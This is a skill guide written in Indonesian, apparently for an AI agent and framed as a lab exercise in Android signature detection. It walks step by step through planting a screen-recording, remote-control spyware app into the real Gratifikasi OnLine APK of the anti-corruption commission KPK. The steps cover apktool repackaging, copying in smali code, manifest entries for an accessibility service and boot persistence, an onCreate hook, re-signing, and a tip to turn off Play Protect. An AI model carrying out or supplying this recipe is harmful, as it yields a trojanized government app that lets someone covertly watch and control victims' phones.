---
name: lab2-apk-injection
description: Panduan skill untuk APK injection — menanam GabutPoC ke dalam GOL APK dan menguji sign detection Android. Trigger: inject, repackage, penanaman, plant, APK injection, sign detection, gabutpoc, GOL, KPK.
---

# Skill: APK Injection & Sign Detection

## Tujuan

Menanam APK **GabutPoC** (screen recorder + remote control via WebRTC) ke dalam
APK **Gratifikasi OnLine (GOL)** milik KPK, lalu menguji **sign detection** Android
saat APK yang sudah dimodifikasi di-install.

## Prasyarat

| Tool | Fungsi |
|------|--------|
| `apktool` | Unpack/repack APK |
| `jadx` | Decompile APK ke Java |
| `adb` | Install APK ke emulator/device |
| `apksigner` / `jarsigner` | Sign APK |
| `keytool` | Cek certificate |
| `Android SDK` (build-tools) | Build tools |
| Docker Desktop | Server containers |

## Struktur Sistem

```
Server (10.103.105.79)
├── SRS (ossrs/srs:5)          :1985 (WHIP/WHEP API) + :8000/UDP (WebRTC)
├── Control Relay (Node.js)    :8092 (WebSocket)
└── Dashboard (nginx)          :8088 (web UI)

APK GabutPoC (com.example.screenwhip)
├── MainActivity               Tombol start stream + enable control
├── ScreenCaptureService       Foreground service, capture + WHIP publish
├── KioskControlService        AccessibilityService, remote control via WS
├── WhipClient                 HTTP client for WHIP signaling
├── DeviceId                   Generate unique stream name
├── BootReceiver               Auto-start on boot
└── ForcedH264EncoderFactory   Force H.264 encoder for emulator

APK GOL (com.kpk.gol)
└── Ionic/Cordova + Firebase WebView app
```

## Langkah Injeksi

### 1. Build GabutPoC

```bash
cd lets/android
./gradlew assembleDebug
# Output: app/build/outputs/apk/debug/app-x86_64-debug.apk
```

### 2. Unpack GOL APK

```bash
apktool d com.kpk.gol.apk -o gol_unpacked
```

### 3. Integrasi Kode

**A. Tambah Smali/kode GabutPoC:**
```bash
# Extract GabutPoC DEX
cd lets/android/app/build/outputs/apk/debug
unzip app-x86_64-debug.apk -d gabutpoc_unpacked

# Copy smali ke GOL unpacked
cp -r gabutpoc_unpacked/smali/com/example/screenwhip \
      gol_unpacked/smali/com/example/screenwhip/
cp -r gabutpoc_unpacked/smali/org/webrtc/ForcedH264EncoderFactory.smali \
      gol_unpacked/smali/org/webrtc/
```

**B. Update AndroidManifest.xml:**
```xml
<!-- Tambah ke <manifest> -->
<uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
<uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
<uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />

<!-- Tambah ke <application> -->
<service android:name="com.example.screenwhip.ScreenCaptureService"
    android:exported="false" android:foregroundServiceType="mediaProjection" />

<service android:name="com.example.screenwhip.KioskControlService"
    android:exported="true"
    android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
    <intent-filter>
        <action android:name="android.accessibilityservice.AccessibilityService" />
    </intent-filter>
    <meta-data android:name="android.accessibilityservice"
        android:resource="@xml/accessibility_service_config" />
</service>

<receiver android:name="com.example.screenwhip.BootReceiver" android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.BOOT_COMPLETED" />
        <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
    </intent-filter>
</receiver>
```

**C. Inject ke MainActivity smali:**
```smali
# Di onCreate, tambah setelah loadUrl:
invoke-static {p0}, Lcom/example/screenwhip/BootReceiver;->scheduleStart(Landroid/content/Context;)V
```

### 4. Repackage & Sign

```bash
apktool b gol_unpacked -o gol_modified.apk

# Sign dengan debug key
apksigner sign --ks ~/.android/debug.keystore \
    --ks-pass pass:android \
    --key-pass pass:android \
    gol_modified.apk
```

### 5. Test Sign Detection

```bash
# Cek signature asli
keytool -printcert -jarfile com.kpk.gol.apk 2>&1 | findstr "Owner:"

# Cek signature modifikasi
keytool -printcert -jarfile gol_modified.apk 2>&1 | findstr "Owner:"

# Install test
adb install com.kpk.gol.apk                    # Install APK asli
adb install gol_modified.apk                    # Coba update → diobservasi
```

## Expected Results

| Test | Expected |
|------|----------|
| Install GOL asli | Success |
| Install modified over asli | `INSTALL_FAILED_UPDATE_INCOMPATIBLE` atau `SIGNATURE_MISMATCH` |
| Install modified fresh | Success (debug sign) |
| Play Protect scan | Flag as spyware (screen capture + accessibility) |
| Google Play Integrity | Failed (signature not matching Play Store) |

## Troubleshooting

| Masalah | Solusi |
|---------|--------|
| `INSTALL_FAILED_NO_MATCHING_ABIS` | Gabung native libs (.so) dari GabutPoC ke GOL |
| `Failure [INSTALL_FAILED_UPDATE_INCOMPATIBLE]` | Uninstall dulu APK asli |
| Play Protect blokir | Settings → Play Protect → matikan scan |
| App crash di startup | Cek logcat: `adb logcat -s AndroidRuntime` |
